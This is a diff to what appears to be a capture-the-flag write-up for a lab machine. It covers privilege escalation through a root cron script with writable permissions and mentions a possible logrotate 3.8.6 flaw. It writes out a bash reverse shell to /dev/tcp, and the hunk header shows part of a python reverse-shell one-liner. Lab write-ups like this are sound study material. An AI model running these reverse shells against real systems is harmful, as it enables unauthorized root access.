@@ -45,14 +45,16 @@ export RHOST="IP";export RPORT=PORTA;python -c 'import sys,socket,os,pty;s=socke
 ## Post Exploitation
 I ran `linpeas` to find potential vectors for privilege escalation. We found a `.sh` file (with misconfigured permissions) that is set to run as root in a cron job. This seems to be the likely path, but let’s examine the rest of the system to be sure.
 ![pos 1 image](../images/lion/pos1.webp)
+<br>
 ![pos 2 image](../images/lion/pos2.webp)
 ![pos 3 image](../images/lion/pos3.webp)
 
 There appears to be a logrotate version 3.8.6, which may be vulnerable. If our attempt with the cron job doesn’t work, we can try exploiting the logrotate vulnerability as an alternative.
+<br>
 ![pos 4 image](../images/lion/pos4.webp)
 
 Going back to the cron job, since we have write permissions on the file, we can modify it and apply the payload. After making the changes, we just need to wait for the cron job to execute and gain privilege escalation.
-
-`/bin/bash -c 'sh -i >& /dev/tcp/ip/porta 0>&1'`
+<br>
+```/bin/bash -c 'sh -i >& /dev/tcp/ip/porta 0>&1'```
 ![pos 5 image](../images/lion/pos5.webp)
 ![pos 6 image](../images/lion/pos6.webp)
